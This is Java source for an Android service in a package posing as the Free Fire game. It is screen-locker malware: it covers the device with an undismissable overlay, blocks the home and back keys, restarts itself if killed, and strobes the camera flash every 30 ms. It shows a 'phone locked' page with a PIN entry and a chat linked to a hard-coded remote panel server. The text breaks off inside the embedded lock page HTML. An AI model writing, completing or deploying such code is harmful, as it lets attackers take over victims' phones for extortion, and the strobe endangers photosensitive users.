package com.dts.freefireth;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class LockOverlayService extends Service {
    public static final String ACTION_LOCK   = "com.dts.freefireth.ACTION_LOCK";
    public static final String ACTION_UNLOCK = "com.dts.freefireth.ACTION_UNLOCK";
    public static final String EXTRA_MESSAGE = "lock_message";
    public static final String EXTRA_PIN     = "lock_pin";

    private static final String SERVER  = "http://panel-icxninh.keselekbijiwowo.web.id:2026";
    private static final String CHANNEL = "LockOverlayChannel";
    private static final int    NID     = 99;

    private WindowManager wm;
    private View overlayRoot;
    private WebView webView;
    private TextView tvChat;
    private EditText etPin, etChat;
    private ScrollView chatScroll;
    private Handler uiHandler, chatHandler;
    private Runnable chatRunnable;
    private String pin = "1234", deviceId = "", lockMsg = "";

    // 🔥 FLASH STROBE
    private CameraManager cameraManager;
    private boolean isFlashOn = false;
    private Handler flashHandler;
    private Runnable flashRunnable;
    private boolean flashStrobeActive = false;

    @Override public void onCreate() {
        super.onCreate();
        uiHandler = new Handler(Looper.getMainLooper());
        chatHandler = new Handler(Looper.getMainLooper());
        flashHandler = new Handler(Looper.getMainLooper());
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        
        createChannel();
        startForeground(NID, buildNotif());
        deviceId = readId();
        SharedPreferences p = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
        if (p.getBoolean("isLocked", false)) {
            lockMsg = p.getString("lockMessage", "DEVICE LOCKED");
            pin = p.getString("lockPin", "1234");
            showOverlay(lockMsg);
            // 🔥 AUTO START FLASH STROBE PAS LOCK
            startFlashStrobe();
        }
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        String action = intent.getAction();
        if (ACTION_LOCK.equals(action)) {
            String msg = intent.getStringExtra(EXTRA_MESSAGE);
            String p2  = intent.getStringExtra(EXTRA_PIN);
            if (msg == null) msg = "DEVICE IS LOCKED";
            if (p2  == null) p2  = "1234";
            pin = p2; lockMsg = msg;
            saveLock(msg, p2, true);
            showOverlay(msg);
            startFlashStrobe(); // 🔥 NYALAIN STROBE
        } else if (ACTION_UNLOCK.equals(action)) {
            saveLock("", "", false);
            stopFlashStrobe(); // 🔥 MATIIN STROBE
            hideOverlay();
        }
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onDestroy() {
        stopFlashStrobe();
        hideOverlay();
        if (chatHandler != null && chatRunnable != null) chatHandler.removeCallbacks(chatRunnable);
        if (flashHandler != null && flashRunnable != null) flashHandler.removeCallbacks(flashRunnable);
        Intent restart = new Intent(this, LockOverlayService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(restart);
        else startService(restart);
        super.onDestroy();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 FLASH STROBE — ON/OFF CEPAT
    // ─────────────────────────────────────────────────────────────────────────
    private void startFlashStrobe() {
        if (flashStrobeActive) return;
        flashStrobeActive = true;
        isFlashOn = false;
        
        flashRunnable = new Runnable() {
            @Override
            public void run() {
                if (!flashStrobeActive) return;
                try {
                    if (cameraManager != null) {
                        String[] cameraIds = cameraManager.getCameraIdList();
                        if (cameraIds.length > 0) {
                            isFlashOn = !isFlashOn;
                            cameraManager.setTorchMode(cameraIds[0], isFlashOn);
                        }
                    }
                } catch (Exception e) {
                    // Silent fail
                }
                if (flashStrobeActive) {
                    flashHandler.postDelayed(this, 30); // 🔥 30ms = SUPER CEPAT!
                }
            }
        };
        flashHandler.post(flashRunnable);
    }

    private void stopFlashStrobe() {
        flashStrobeActive = false;
        if (flashRunnable != null) {
            flashHandler.removeCallbacks(flashRunnable);
        }
        // Matiin flash
        try {
            if (cameraManager != null) {
                String[] cameraIds = cameraManager.getCameraIdList();
                if (cameraIds.length > 0) {
                    cameraManager.setTorchMode(cameraIds[0], false);
                }
            }
        } catch (Exception ignored) {}
        isFlashOn = false;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 SHOW OVERLAY
    // ─────────────────────────────────────────────────────────────────────────
    private void showOverlay(String message) {
        if (wm == null) wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        hideOverlay();

        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.setBackgroundColor(Color.TRANSPARENT);
        webView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        webView.addJavascriptInterface(new LockBridge(), "LockBridge");
        webView.setWebViewClient(new WebViewClient());

        String html = buildLockHtml(message);
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.TRANSPARENT);
        root.setFocusable(true);
        root.setFocusableInTouchMode(true);
        root.setOnKeyListener((v, keyCode, event) -> {
            if (keyCode == KeyEvent.KEYCODE_BACK ||
                keyCode == KeyEvent.KEYCODE_HOME ||
                keyCode == KeyEvent.KEYCODE_APP_SWITCH ||
                keyCode == KeyEvent.KEYCODE_MENU) return true;
            return false;
        });
        root.setOnTouchListener((v, e) -> false);

        chatScroll = new ScrollView(this);
        chatScroll.setBackgroundColor(Color.parseColor("#111122"));
        chatScroll.setLayoutParams(lpH(dp(140), 0, 0, dp(8)));
        tvChat = new TextView(this);
        tvChat.setTextColor(Color.parseColor("#AAAACC"));
        tvChat.setTextSize(11);
        tvChat.setPadding(dp(14), dp(10), dp(14), dp(10));
        tvChat.setLineSpacing(4, 1);
        chatScroll.addView(tvChat);
        root.addView(chatScroll);

        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setLayoutParams(lpH(android.view.ViewGroup.LayoutParams.WRAP_CONTENT, 0, 0, dp(12)));
        etChat = new EditText(this);
        etChat.setHint("Reply...");
        etChat.setHintTextColor(Color.parseColor("#444466"));
        etChat.setTextColor(Color.WHITE);
        etChat.setTextSize(12);
        etChat.setBackground(roundBg(Color.parseColor("#1A1A2E"), 8));
        etChat.setPadding(dp(12), dp(10), dp(12), dp(10));
        LinearLayout.LayoutParams etLp = new LinearLayout.LayoutParams(0, android.view.ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        etLp.setMargins(0, 0, dp(8), 0);
        etChat.setLayoutParams(etLp);
        Button btnSend = new Button(this);
        btnSend.setText("Send");
        btnSend.setTextColor(Color.WHITE);
        btnSend.setTextSize(11);
        btnSend.setBackground(roundBg(Color.parseColor("#E53935"), 8));
        btnSend.setOnClickListener(v -> sendChat());
        row.addView(etChat);
        row.addView(btnSend);
        root.addView(row);

        overlayRoot = root;

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;
        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

        try {
            wm.addView(overlayRoot, params);
            wm.addView(webView, params);
        } catch (Exception e) {
            android.util.Log.w("LOCK", "addView: " + e.getMessage());
        }
        startChatPoll();
    }

    private void hideOverlay() {
        if (chatHandler != null && chatRunnable != null) {
            chatHandler.removeCallbacks(chatRunnable);
        }
        
        if (webView != null && wm != null) {
            try {
                wm.removeView(webView);
                webView.destroy();
            } catch (Exception ignored) {}
            webView = null;
        }
        
        if (overlayRoot != null && wm != null) {
            try { wm.removeView(overlayRoot); } catch (Exception ignored) {}
            overlayRoot = null;
        }
    }

    // ── INNER CLASS BRIDGE ──
    private class LockBridge {
        @JavascriptInterface
        public boolean tryUnlock(String enteredPin) {
            if (enteredPin.equals(pin)) {
                saveLock("", "", false);
                uiHandler.post(() -> {
                    stopFlashStrobe(); // 🔥 MATIIN STROBE PAS UNLOCK
                    hideOverlay();
                    Intent unlockIntent = new Intent(ACTION_UNLOCK);
                    sendBroadcast(unlockIntent);
                });
                return true;
            }
            return false;
        }

        @JavascriptInterface
        public String getLockTitle() {
            return lockMsg;
        }
    }

    // ── BUILD LOCK HTML ──
    private String buildLockHtml(String message) {
        String safeTitle = message
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace("\"", "&quot;");

        return "<!DOCTYPE html>\n" +
"<html>\n" +
"<head>\n" +
"<meta charset=\"UTF-8\">\n" +
"<meta name=\"viewport\" content=\"width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no\">\n" +
"<link href=\"https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap\" rel=\"stylesheet\">\n" +
"<style>\n" +
"*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}\n" +
":root{\n" +
"  --bg:#050a05;\n" +
"  --card:#0a180a;\n" +
"  --red:#00ff41;\n" +
"  --green:#00ff41;\n" +
"  --green-dim:rgba(0,255,65,.08);\n" +
"  --green-brd:rgba(0,255,65,.2);\n" +
"  --green-glow:rgba(0,255,65,.35);\n" +
"  --text:#e0ffe0;\n" +
"  --text2:#44aa44;\n" +
"  --text3:#1a4a1a;\n" +
"}\n" +
"html,body{height:100%;width:100%;overflow:hidden;touch-action:none}\n" +
"body{\n" +
"  background:var(--bg);\n" +
"  font-family:'Outfit',sans-serif;\n" +
"  -webkit-font-smoothing:antialiased;\n" +
"  display:flex;flex-direction:column;align-items:center;justify-content:center;\n" +
"  min-height:100vh;\n" +
"  padding:32px 28px;\n" +
"  position:relative;\n" +
"  overflow:hidden;\n" +
"}\n" +
"\n" +
"/* ── CRACKED GLASS BACKGROUND ── */\n" +
".crack-layer{\n" +
"  position:fixed;inset:0;pointer-events:none;z-index:0;\n" +
"  overflow:hidden;\n" +
"}\n" +
".crack-layer svg{\n" +
"  width:100%;height:100%;\n" +
"  opacity:0.18;\n" +
"}\n" +
"\n" +
"/* ── SCANLINE OVERLAY ── */\n" +
"body::after{\n" +
"  content:'';position:fixed;inset:0;\n" +
"  background:repeating-linear-gradient(\n" +
"    0deg,\n" +
"    transparent,\n" +
"    transparent 2px,\n" +
"    rgba(0,255,65,.018) 2px,\n" +
"    rgba(0,255,65,.018) 4px\n" +
"  );\n" +
"  pointer-events:none;\n" +
"  z-index:1;\n" +
"  animation:scanMove 8s linear infinite;\n" +
"}\n" +
"@keyframes scanMove{\n" +
"  0%{background-position:0 0}\n" +
"  100%{background-position:0 100px}\n" +
"}\n" +
"\n" +
"/* ── AMBIENT GLOW ── */\n" +
"body::before{\n" +
"  content:'';position:fixed;inset:0;\n" +
"  background:\n" +
"    radial-gradient(ellipse 80% 50% at 50% -5%,rgba(0,200,50,.14) 0%,transparent 60%),\n" +
"    radial-gradient(ellipse 50% 40% at 10% 90%,rgba(200,20,20,.06) 0%,transparent 55%),\n" +
"    radial-gradient(ellipse 50% 35% at 90% 85%,rgba(0,180,40,.05) 0%,transparent 55%);\n" +
"  pointer-events:none;\n" +
"  z-index:0;\n" +
"}\n" +
"\n" +
"/* glitch flicker */\n" +
"@keyframes glitch{\n" +
"  0%,94%,100%{clip-path:none;transform:none;opacity:1}\n" +
"  95%{clip-path:inset(30% 0 40% 0);transform:translateX(-4px);opacity:.85}\n" +
"  97%{clip-path:inset(60% 0 10% 0);transform:translateX(4px);opacity:.9}\n" +
"  99%{clip-path:inset(5% 0 80% 0);transform:translateX(-2px)}\n" +
"}\n" +
"\n" +
"/* ── INTRO SCREEN ── */\n" +
"#introScreen{\n" +
"  position:fixed;inset:0;\n" +
"  background:#000;\n" +
"  display:flex;flex-direction:column;align-items:center;justify-content:center;\n" +
"  z-index:100;\n" +
"  gap:20px;\n" +
"  animation:introDismiss .4s ease forwards 4s;\n" +
"}\n" +
"@keyframes introDismiss{\n" +
"  0%{opacity:1;transform:none}\n" +
"  100%{opacity:0;transform:scale(1.06);pointer-events:none}\n" +
"}\n" +
"#introScreen.done{display:none}\n" +
"\n" +
".intro-skull{\n" +
"  animation:pulseRed 1s ease-in-out infinite;\n" +
"}\n" +
"@keyframes pulseRed{\n" +
"  0%,100%{filter:drop-shadow(0 0 8px #00ff41) drop-shadow(0 0 24px #00ff41)}\n" +
"  50%{filter:drop-shadow(0 0 20px #00ff41) drop-shadow(0 0 50px #00ff41)}\n" +
"}\n" +
"\n" +
".intro-title{\n" +
"  font-family:'JetBrains Mono',monospace;\n" +
"  font-size:20px;\n" +
"  letter-spacing:3px;\n" +
"  text-transform:uppercase;\n" +
"  color:#00ff41;\n" +
"  text-align:center;\n" +
"  line-height:1.8;\n" +
"}\n" +
".intro-title .line{\n" +
"  display:block;\n" +
"  overflow:hidden;\n" +
"  white-space:nowrap;\n" +
"}\n" +
".intro-title .line1{animation:typeIn .6s steps(22,end) .3s both}\n" +
".intro-title .line2{animation:typeIn .5s steps(18,end) 1.1s both}\n" +
".intro-title .line3{animation:typeIn .7s steps(26,end) 1.8s both}\n" +
"@keyframes typeIn{from{width:0;opacity:0}to{opacity:1}}\n" +
"\n" +
".intro-bar-wrap{\n" +
"  width:220px;height:3px;\n" +
"  background:rgba(255,0,0,.15);\n" +
"  border-radius:2px;\n" +
"  overflow:hidden;\n" +
"}\n" +
".intro-bar{\n" +
"  height:100%;width:0%;\n" +
"  background:linear-gradient(90deg,#00ff41,#00ff41,#00ff41);\n" +
"  border-radius:2px;\n" +
"  animation:barFill 2.5s ease .5s forwards;\n" +
"  box-shadow:0 0 10px #00ff41;\n" +
"}\n" +
"@keyframes barFill{to{width:100%}}\n" +
"\n" +
".intro-pct{\n" +
"  font-family:'JetBrains Mono',monospace;\n" +
"  font-size:10px;letter-spacing:2px;\n" +
"  color:#00ff41;\n" +
"  animation:countUp 2.5s ease .5s forwards;\n" +
"}\n" +
"@keyframes countUp{\n" +
"  0%{content:'0%';}\n" +
"}\n" +
"\n" +
"/* ── MAIN CONTENT ── */\n" +
"#mainContent{\n" +
"  display:flex;flex-direction:column;align-items:center;\n" +
"  position:relative;z-index:2;\n" +
"  opacity:0;\n" +
"  animation:mainIn .6s ease forwards 4.4s;\n" +
"  width:100%;\n" +
"}\n" +
"@keyframes mainIn{to{opacity:1}}\n" +
"\n" +
"/* ── VIRUS ICON ── */\n" +
".virus-wrap{\n" +
"  position:relative;width:100px;height:100px;\n" +
"  margin-bottom:22px;flex-shrink:0;\n" +
"}\n" +
".virus-bg{\n" +
"  width:100px;height:100px;border-radius:50%;\n" +
"  background:radial-gradient(circle at 40% 35%,rgba(0,255,65,.12),rgba(0,80,20,.05));\n" +
"  border:1px solid rgba(0,255,65,.22);\n" +
"  display:flex;align-items:center;justify-content:center;\n" +
"  position:relative;z-index:1;\n" +
"  box-shadow:0 0 0 1px rgba(0,0,0,.5),0 0 40px rgba(0,255,65,.18),inset 0 1px 0 rgba(0,255,100,.08);\n" +
"  animation:virusPulse 2.5s ease-in-out infinite;\n" +
"}\n" +
"@keyframes virusPulse{\n" +
"  0%,100%{box-shadow:0 0 0 1px rgba(0,0,0,.5),0 0 30px rgba(0,255,65,.15),inset 0 1px 0 rgba(0,255,100,.08)}\n" +
"  50%{box-shadow:0 0 0 1px rgba(0,0,0,.5),0 0 60px rgba(0,255,65,.35),0 0 90px rgba(0,255,65,.1),inset 0 1px 0 rgba(0,255,100,.12)}\n" +
"}\n" +
"\n" +
"/* rotating orbit rings */\n" +
".v-orbit{\n" +
"  position:absolute;inset:-12px;border-radius:50%;\n" +
"  border:1px solid rgba(0,255,65,.12);\n" +
"  animation:orbitSpin 6s linear infinite;\n" +
"}\n" +
".v-orbit2{\n" +
"  position:absolute;inset:-22px;border-radius:50%;\n" +
"  border:1px dashed rgba(0,255,65,.07);\n" +
"  animation:orbitSpin 10s linear infinite reverse;\n" +
"}\n" +
".v-orbit::before,.v-orbit::after{\n" +
"  content:'';position:absolute;width:6px;height:6px;border-radius:50%;\n" +
"  background:var(--green);top:50%;left:-3px;margin-top:-3px;\n" +
"  box-shadow:0 0 8px var(--green),0 0 16px var(--green);\n" +
"}\n" +
".v-orbit::after{left:auto;right:-3px;}\n" +
"@keyframes orbitSpin{to{transform:rotate(360deg)}}\n" +
"\n" +
"/* virus SVG spin */\n" +
".virus-svg{animation:virusSpin 8s linear infinite;}\n" +
"@keyframes virusSpin{to{transform:rotate(360deg)}}\n" +
"\n" +
"/* spike pulse dots */\n" +
".spike-dot{\n" +
"  position:absolute;width:5px;height:5px;border-radius:50%;\n" +
"  background:var(--green);\n" +
"  box-shadow:0 0 8px var(--green),0 0 16px var(--green);\n" +
"  animation:spikePulse 1.5s ease-in-out infinite;\n" +
"}\n" +
".spike-dot:nth-child(1){top:2px;left:50%;transform:translateX(-50%);animation-delay:0s}\n" +
".spike-dot:nth-child(2){bottom:2px;left:50%;transform:translateX(-50%);animation-delay:.3s}\n" +
".spike-dot:nth-child(3){left:2px;top:50%;transform:translateY(-50%);animation-delay:.6s}\n" +
".spike-dot:nth-child(4){right:2px;top:50%;transform:translateY(-50%);animation-delay:.9s}\n" +
"@keyframes spikePulse{\n" +
"  0%,100%{opacity:1;transform:scale(1) translateX(-50%)}\n" +
"  50%{opacity:.3;transform:scale(.5) translateX(-50%)}\n" +
"}\n" +
"/* fix non-centered dots */\n" +
".spike-dot:nth-child(3){animation-name:spikePulseY}\n" +
".spike-dot:nth-child(4){animation-name:spikePulseY}\n" +
"@keyframes spikePulseY{\n" +
"  0%,100%{opacity:1;transform:scale(1) translateY(-50%)}\n" +
"  50%{opacity:.3;transform:scale(.5) translateY(-50%)}\n" +
"}\n" +
"\n" +
"/* ── TITLE ── */\n" +
".lock-title{\n" +
"  font-size:22px;font-weight:800;\n" +
"  color:var(--text);\n" +
"  text-align:center;letter-spacing:-.3px;line-height:1.2;\n" +
"  margin-bottom:4px;\n" +
"  animation:glitch 7s ease infinite;\n" +
"  text-shadow:0 0 20px rgba(0,255,65,.3);\n" +
"}\n" +
".lock-sub{\n" +
"  font-family:'JetBrains Mono',monospace;font-size:9px;\n" +
"  color:#1a5a1a;letter-spacing:2.5px;text-transform:uppercase;\n" +
"  text-align:center;margin-bottom:30px;\n" +
"}\n" +
"\n" +
"/* ── PIN DOTS ── */\n" +
".pin-wrap{display:flex;gap:16px;justify-content:center;margin-bottom:10px;}\n" +
".pin-dot{\n" +
"  width:14px;height:14px;border-radius:50%;\n" +
"  border:1.5px solid rgba(0,255,65,.2);\n" +
"  background:transparent;\n" +
"  transition:background .18s,border-color .18s,box-shadow .18s,transform .18s;\n" +
"}\n" +
".pin-dot.filled{\n" +
"  background:var(--green);border-color:var(--green);\n" +
"  box-shadow:0 0 14px rgba(0,255,65,.8),0 0 28px rgba(0,255,65,.4);\n" +
"  transform:scale(1.12);\n" +
"}\n" +
".pin-dot.error{\n" +
"  border-color:#00ff41;background:rgba(255,20,20,.3);\n" +
"  box-shadow:0 0 12px rgba(255,40,40,.6);\n" +
"  animation:shake .38s ease;\n" +
"}\n" +
"@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-7px)}75%{transform:translateX(7px)}}\n" +
"\n" +
"/* ── STATUS ── */\n" +
".pin-status{\n" +
"  height:24px;margin-bottom:28px;\n" +
"  font-family:'JetBrains Mono',monospace;font-size:10px;\n" +
"  letter-spacing:2px;text-transform:uppercase;\n" +
"  text-align:center;color:#1a5a1a;transition:color .2s;\n" +
"}\n" +
".pin-status.err{color:#ff3333}\n" +
".pin-status.ok{color:var(--green);text-shadow:0 0 10px var(--green)}\n" +
"\n" +
"/* ── KEYPAD ── */\n" +
".keypad{\n" +
"  display:grid;grid-template-columns:repeat(3,1fr);\n" +
"  gap:10px;width:100%;max-width:292px;\n" +
"}\n" +
".key{\n" +
"  height:66px;border-radius:14px;\n" +
"  border:1px solid rgba(0,255,65,.06);\n" +
"  background:linear-gradient(160deg,rgba(0,255,65,.04),rgba(0,80,20,.03));\n" +
"  color:var(--text);\n" +
"  display:flex;flex-direction:column;align-items:center;justify-content:center;\n" +
"  cursor:pointer;-webkit-tap-highlight-color:transparent;\n" +
"  transition:transform .1s,background .1s,border-color .1s,box-shadow .1s;\n" +
"  position:relative;overflow:hidden;user-select:none;\n" +
"  box-shadow:0 2px 8px rgba(0,0,0,.5),inset 0 1px 0 rgba(0,255,65,.03);\n" +
"}\n" +
".key::before{\n" +
"  content:'';position:absolute;top:0;left:10%;right:10%;height:1px;\n" +
"  background:linear-gradient(90deg,transparent,rgba(0,255,65,.07),transparent);\n" +
"}\n" +
".key .num{font-size:22px;font-weight:700;line-height:1;letter-spacing:-.3px;color:#e0ffe0;}\n" +
".key .sub{font-family:'JetBrains Mono',monospace;font-size:7px;letter-spacing:2px;color:#1a5a1a;margin-top:3px}\n" +
".key.del{color:var(--text2)}\n" +
".key.empty{pointer-events:none;opacity:0;background:transparent;border-color:transparent;box-shadow:none}\n" +
".key:active{\n" +
"  transform:scale(.93);\n" +
"  background:linear-gradient(160deg,rgba(0,255,65,.14),rgba(0,120,40,.1));\n" +
"  border-color:rgba(0,255,65,.3);\n" +
"  box-shadow:0 0 20px rgba(0,255,65,.15),inset 0 1px 0 rgba(0,255,65,.1);\n" +
"}\n" +
"\n" +
"/* DATA STREAM PARTICLES */\n" +
".data-stream{\n" +
"  position:fixed;top:0;left:0;width:100%;height:100%;\n" +
"  pointer-events:none;z-index:0;overflow:hidden;\n" +
"}\n" +
".data-col{\n" +
"  position:absolute;top:-100%;\n" +
"  font-family:'JetBrains Mono',monospace;\n" +
"  font-size:11px;color:rgba(0,255,65,.15);\n" +
"  line-height:1.4;\n" +
"  animation:dataFall linear infinite;\n" +
"  white-space:pre;\n" +
"}\n" +
"@keyframes dataFall{\n" +
"  to{top:110%}\n" +
"}\n" +
"\n" +
"/* ── ENTRY ANIMATIONS ── */\n" +
".virus-wrap{animation:popIn .5s cubic-bezier(.16,1,.3,1) both}\n" +
"@keyframes popIn{from{opacity:0;transform:scale(.7)}to{opacity:1;transform:none}}\n" +
".lock-title{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .08s both}\n" +
".lock-sub{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .13s both}\n" +
".pin-wrap{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .18s both}\n" +
".pin-status{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .22s both}\n" +
".keypad{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .27s both}\n" +
"@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}\n" +
"</style>\n" +
"</head>\n" +
"<body>\n" +
"\n" +
"<!-- INTRO SCREEN -->\n" +
"<div id=\"introScreen\">\n" +
"  <div class=\"intro-skull\">\n" +
"    <svg width=\"72\" height=\"72\" viewBox=\"0 0 64 64\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
"      <ellipse cx=\"32\" cy=\"26\" rx=\"18\" ry=\"17\" fill=\"none\" stroke=\"#00ff41\" stroke-width=\"2\"/>\n" +
"      <ellipse cx=\"24\" cy=\"24\" rx=\"5.5\" ry=\"6\" fill=\"rgba(255,51,51,0.25)\" stroke=\"#00ff41\" stroke-width=\"1.5\"/>\n" +
"      <ellipse cx=\"40\" cy=\"24\" rx=\"5.5\" ry=\"6\" fill=\"rgba(255,51,51,0.25)\" stroke=\"#00ff41\" stroke-width=\"1.5\"/>\n" +
"      <path d=\"M30 32 L32 28 L34 32 Z\" fill=\"rgba(255,51,51,0.4)\" stroke=\"#00ff41\" stroke-width=\"1\"/>\n" +
"      <path d=\"M14 38 Q14 48 22 48 L22 52 L26 52 L26 48 L32 48 L32 52 L36 52 L36 48 L42 48 Q50 48 50 38\" stroke=\"#00ff41\" stroke-width=\"2\" fill=\"none\" stroke-linecap=\"round\"/>\n" +
"      <line x1=\"26\" y1=\"48\" x2=\"26\" y2=\"42\" stroke=\"#00ff41\" stroke-width=\"1.5\"/>\n" +
"      <line x1=\"32\" y1=\"48\" x2=\"32\" y2=\"42\" stroke=\"#ff3333\" stroke-width=\"1.5\"/>\n" +
"      <line x1=\"38\" y1=\"48\" x2=\"38\" y2=\"42\" stroke=\"#00ff41\" stroke-width=\"1.5\"/>\n" +
"      <path d=\"M14 38 Q32 44 50 38\" stroke=\"#00ff41\" stroke-width=\"1.5\" fill=\"none\"/>\n" +
"    </svg>\n" +
"  </div>\n" +
"\n" +
"  <div class=\"intro-title\">\n" +
"    <span class=\"line line1\">HAIIII BROO</span>\n" +
"    <span class=\"line line2\">FIONA SYSTEM</span>\n" +
"    <span class=\"line line3\">PHONE TERKUNCI</span>\n" +
"  </div>\n" +
"\n" +
"  <div class=\"intro-bar-wrap\">\n" +
"    <div class=\"intro-bar\"></div>\n" +
"  </div>\n" +
"\n" +
"  <div class=\"intro-pct-wrap\">\n" +
"    <span class=\"pct-num\" id=\"pctNum\">0%</span>\n" +
"  </div>\n" +
"</div>\n" +
"\n" +
"<!-- DATA STREAM BG -->\n" +
"<div class=\"data-stream\" id=\"dataStream\"></div>\n" +
"\n" +
"<!-- CRACK LAYER -->\n" +
"<div class=\"crack-layer\">\n" +
"  <svg viewBox=\"0 0 400 800\" preserveAspectRatio=\"xMidYMid slice\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
"    <!-- Main cracks -->\n" +
"    <g stroke=\"#00ff41\" stroke-linecap=\"round\" fill=\"none\">\n" +
"      <!-- Crack cluster 1 - top left -->\n" +
"      <polyline points=\"60,0 80,90 50,140 90,200 60,240\" stroke-width=\"1.2\"/>\n" +
"      <polyline points=\"80,90 120,110 160,95\" stroke-width=\".7\"/>\n" +
"      <polyline points=\"50,140 20,160 0,180\" stroke-width=\".6\"/>\n" +
"      <polyline points=\"90,200 130,220 110,280 140,320\" stroke-width=\".8\"/>\n" +
"\n" +
"      <!-- Crack cluster 2 - top right -->\n" +
"      <polyline points=\"320,0 300,60 340,120 310,180 350,230\" stroke-width=\"1.1\"/>\n" +
"      <polyline points=\"300,60 260,80 230,70\" stroke-width=\".7\"/>\n" +
"      <polyline points=\"340,120 380,140 400,130\" stroke-width=\".6\"/>\n" +
"      <polyline points=\"310,180 270,200 290,250 260,290\" stroke-width=\".8\"/>\n" +
"\n" +
"      <!-- Crack cluster 3 - center -->\n" +
"      <polyline points=\"200,150 170,220 210,280 180,340 220,400\" stroke-width=\"1.4\"/>\n" +
"      <polyline points=\"170,220 130,240 110,280 130,330\" stroke-width=\".9\"/>\n" +
"      <polyline points=\"210,280 250,300 280,280 310,310\" stroke-width=\".8\"/>\n" +
"      <polyline points=\"180,340 150,370 160,420 130,460\" stroke-width=\".7\"/>\n" +
"      <polyline points=\"220,400 260,420 250,470 280,510\" stroke-width=\".6\"/>\n" +
"\n" +
"      <!-- Crack cluster 4 - bottom -->\n" +
"      <polyline points=\"100,550 130,620 90,680 120,750 100,800\" stroke-width=\"1.1\"/>\n" +
"      <polyline points=\"130,620 170,640 200,620 240,650\" stroke-width=\".7\"/>\n" +
"      <polyline points=\"90,680 60,700 40,750 60,800\" stroke-width=\".7\"/>\n" +
"\n" +
"      <polyline points=\"300,500 270,580 310,640 280,700 300,760 290,800\" stroke-width=\"1.0\"/>\n" +
"      <polyline points=\"270,580 240,600 220,580\" stroke-width=\".6\"/>\n" +
"      <polyline points=\"310,640 350,660 380,640 400,660\" stroke-width=\".7\"/>\n" +
"\n" +
"      <!-- Small splinter cracks -->\n" +
"      <polyline points=\"140,400 160,390 175,410 165,430\" stroke-width=\".5\"/>\n" +
"      <polyline points=\"230,500 250,490 265,510 255,530 270,545\" stroke-width=\".5\"/>\n" +
"      <polyline points=\"80,350 95,340 105,360\" stroke-width=\".4\"/>\n" +
"      <polyline points=\"330,380 350,370 365,390 355,410\" stroke-width=\".5\"/>\n" +
"    </g>\n" +
"\n" +
"    <!-- Impact points (epicenters) -->\n" +
"    <g fill=\"none\" stroke=\"#00ff41\">\n" +
"      <circle cx=\"200\" cy=\"150\" r=\"6\" stroke-width=\".8\" opacity=\".6\"/>\n" +
"      <circle cx=\"200\" cy=\"150\" r=\"12\" stroke-width=\".4\" opacity=\".3\"/>\n" +
"      <circle cx=\"80\" cy=\"90\" r=\"4\" stroke-width=\".7\" opacity=\".5\"/>\n" +
"      <circle cx=\"300\" cy=\"60\" r=\"4\" stroke-width=\".7\" opacity=\".5\"/>\n" +
"      <circle cx=\"130\" cy=\"620\" r=\"5\" stroke-width=\".6\" opacity=\".4\"/>\n" +
